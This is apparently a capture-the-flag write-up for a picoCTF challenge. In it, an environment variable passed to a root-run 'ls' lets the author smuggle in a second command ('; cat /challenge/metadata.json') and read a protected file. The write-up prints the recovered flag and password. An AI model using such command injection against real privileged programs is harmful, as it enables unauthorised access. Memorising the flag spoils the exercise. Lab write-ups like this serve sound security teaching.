# VNE
Challenge instance has a binary `bin` to run in home directory, there is also a `/challenge` that we can't access, 
when running `bin` we get
```
Error: SECRET_DIR environment variable is not set
```

Set the SECRET_DIR variable to "/challenge"

```

export SECRET_DIR="/challenge"
```

Run again

```
Listing the content of /challenge as root: 
config-box.py  metadata.json  profile
```

`metadata.json` seems promising, but we can't access it because we don't have permission to access `/challenge`
`bin` lists directories at root, so maybe we can get it to call something else. Setting `SECRET_DIR` to "--help"
results in bin printing the help for `ls`, so it probably just appends whatever is in `SECRET_DIR` to `ls`. If we
add a `;` we can run another command.

```
export SECRET_DIR="/challenge; cat /challenge/metadata.json"
./bin
Listing the content of /challenge; cat /challenge/metadata.json as root: 
config-box.py  metadata.json  profile
{"flag": "picoCTF{Power_t0_man!pul4t3_3nv_1ac0e5a3}", "password": "af86add3"}
```
